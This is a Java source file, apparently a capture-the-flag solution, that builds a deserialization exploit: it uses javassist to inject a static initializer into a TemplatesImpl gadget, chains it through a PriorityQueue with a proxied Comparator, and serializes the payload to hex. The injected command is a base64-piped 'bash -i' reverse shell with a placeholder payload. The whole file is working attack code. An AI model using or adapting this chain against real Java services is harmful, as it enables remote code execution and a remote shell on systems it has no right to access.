package com.eddiemurphy;

import com.example.warmup.MyInvocationHandler;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.PriorityQueue;

public class Exp {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }


    public static TemplatesImpl generateEvilTemplates() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Devil");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"bash -c {echo,<base64反弹shell>}|{base64,-d}|{bash,-i}\");";
        // 创建 static 代码块，并插入代码
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilDevil" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        // 转换为bytes
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", targetByteCodes);
        // 进入 defineTransletClasses() 方法需要的条件
        setFieldValue(templates, "_name", "name" + System.nanoTime());
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());


        return templates;
    }

    //序列化
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    //反序列化
    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));
        Object object=ois.readObject();
        return object;
    }

    public static String bytesTohexString(String s) throws IOException {
        File file = new File(s);
        FileInputStream fis = new FileInputStream(file);
        byte[] bytes = new byte[(int) file.length()];
        fis.read(bytes);

        if (bytes == null) {
            return null;
        } else {
            StringBuilder ret = new StringBuilder(2 * bytes.length);

            for(int i = 0; i < bytes.length; ++i) {
                int b = 15 & bytes[i] >> 4;
                ret.append("0123456789abcdef".charAt(b));
                b = 15 & bytes[i];
                ret.append("0123456789abcdef".charAt(b));
            }

            return ret.toString();
        }
    }

    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = generateEvilTemplates();

        MyInvocationHandler myInvocationHandler = new MyInvocationHandler();
        Class c = myInvocationHandler.getClass();
        Field type = c.getDeclaredField("type");
        type.setAccessible(true);
        type.set(myInvocationHandler,Templates.class);

        //代理接口为Comparator,便于后续调用compare方法
        Comparator proxy = (Comparator) Proxy.newProxyInstance(MyInvocationHandler.class.getClassLoader(), new Class[]{Comparator.class}, myInvocationHandler);

        //初始化属性comparator为proxy类
        PriorityQueue priorityQueue = new PriorityQueue(2);


        priorityQueue.add(1);
        priorityQueue.add(2);
        Object[] queue = {templates,templates};

        setFieldValue(priorityQueue,"comparator",proxy);
        setFieldValue(priorityQueue,"queue",queue);

        serialize(priorityQueue);
        System.out.println(bytesTohexString("ser.bin"));
    }
}